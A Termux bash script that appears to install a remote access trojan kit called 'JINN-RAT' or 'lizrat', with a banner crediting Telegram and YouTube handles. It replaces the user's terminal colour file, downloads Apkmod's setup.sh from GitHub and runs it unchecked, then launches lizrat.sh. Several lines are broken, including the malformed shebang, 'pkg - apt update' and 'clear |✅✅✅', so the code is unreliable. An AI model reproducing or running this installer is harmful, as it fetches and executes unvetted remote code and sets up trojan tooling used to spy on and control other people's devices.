#!data/data/com.termux/files/usr/bin/bash

# Colors
clear='\033[0m'
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
Yellow='\033[0;33m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
Black="\033[1;30m"
Violate="\033[1;37m"
Nc="\033[00m"

version="1.0"

logo="
${Green}_____  _____  ____  _____  ____  _____      _______          _     _________  
${Red}   |_   _||_   _||_   \|_   _||_   \|_   _|    |_   __ \        / \   |  _   _  | 
${Cyan}     | |    | |    |   \ | |    |   \ | | ______ | |__) |      / _ \  |_/ | | \_| 
${Purple} _   | |    | |    | |\ \| |    | |\ \| ||______||  __ /      / ___ \     | |     
${Yellow}| |__' |   _| |_  _| |_\   |_  _| |_\   |_      _| |  \ \_  _/ /   \ \_  _| |_    
${Blue}`.____.'  |_____||_____|\____||_____|\____|    |____| |___||____| |____||_____|
${Red}   Telegram : @MrJinnTelegram                [v${version}] 
${Blue}  YouTube : https://bit.ly/3pSnvho         [By alvinbaby] 

___________________________________________₹
                                                                               
${Red}     Coding master : LizOrd                    
${Red}  [ Telegram : https://t.me/lizord2059 ]            
___________________>=______________________₹
${Red}     Repository master : MR JINN        
${Red}  [ Telegram : https://t.me/MrJinnTelegram ] 
___________________________________________₹

"

echo "Please wait..."

cd $HOME
cd .termux
cp colors.properties ../;rm colors.properties
wget https://raw.githubusercontent.com/alvinbaby/Terminal-In-Termux/main/alvinbaby/colors.properties

cd $HOME

echo
sleep 3
pkg - apt update -y;pkg - apt upgrade -y
echo
echo -e "[${Yellow}+${clear}] Termux updated..."
echo -e "[${Yellow}+${clear}] Please wait..."
sleep 3

mkdir lizrat
apt-get install ruby -y

cd $HOME
wget https://github.com/busyloop/lolcat/archive/master.zip
unzip master.zip
cd lolcat-master/bin
gem install lolcat

cd $HOME
wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh
bash setup.sh

clear |✅✅✅

cd JINN-RAT
chmod +x lizrat.sh
bash lizrat.sh
